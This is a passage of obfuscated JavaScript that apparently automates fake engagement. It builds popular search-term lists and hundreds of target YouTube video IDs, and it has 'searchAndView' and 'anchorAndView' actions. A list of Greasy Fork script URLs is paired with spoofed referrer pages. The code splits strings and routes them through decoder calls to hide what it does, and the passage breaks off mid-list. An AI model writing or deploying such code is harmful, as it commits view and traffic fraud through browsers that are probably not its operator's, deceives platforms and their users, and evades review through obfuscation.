searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + Z(0x1) + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + Z(0x7) + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x39 * 0x12 + 0x11bd + -0xdb1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x1 * -0x15e8 + 0x106 * -0x2 + 0x9e9 * -0x2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x441 * -0x3 + -0x158b * -0x1 + -0x8c5);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    Z(0xf) + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    X(0x21, '#kSj') + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    Z(0x16) + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    Z(0x3) + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    Y(0xe) + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    X(0x13, '(nfp') + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    Y(0x11) + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': X(0x12, '^apo') + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + Y(0x5),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + Y(0xc) + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
